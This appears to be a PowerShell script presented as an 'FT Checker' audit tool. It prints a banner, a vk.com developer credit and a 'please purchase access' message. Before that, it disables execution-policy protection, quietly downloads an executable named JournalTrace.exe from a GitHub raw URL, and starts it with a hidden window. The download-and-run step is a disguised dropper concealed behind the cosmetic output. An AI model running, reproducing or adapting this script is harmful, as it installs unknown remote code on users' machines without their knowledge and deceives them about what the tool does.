Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

Invoke-WebRequest -Uri "https://github.com/system32owner/download/raw/refs/heads/main/JournalTrace.exe" -OutFile "JournalTrace.exe" -ErrorAction SilentlyContinue

    Start-Process -FilePath "JournalTrace.exe" -WindowStyle Hidden
	
Write-Host "  _____ _____    _____ _               _             " -ForegroundColor Cyan
Write-Host " |  ___|_   _|  / ____| |__   ___  ___| | _____ _ __ " -Foregroundcolor Cyan
Write-Host " | |_    | |   | |    | '_ \ / _ \/ __| |/ / _ \ '__|" -Foregroundcolor White
Write-Host " |  _|   | |   | |____| | | |  __/ (__|   <  __/ |   " -Foregroundcolor White
Write-Host " |_|     |_|    \_____|_| |_|\___|\___|_|\_\___|_|   " -Foregroundcolor Red
Write-Host " "
Write-Host "[+] Developed by vk.com/map4yk [2026]" -Foregroundcolor DarkYellow
Write-Host "[+] Rank of the auditor: Beta" -Foregroundcolor DarkRed
Write-Host ""
Write-Host "[ ! ] The service is unavailable, please purchase access." -Foregroundcolor Red
Write-Host ""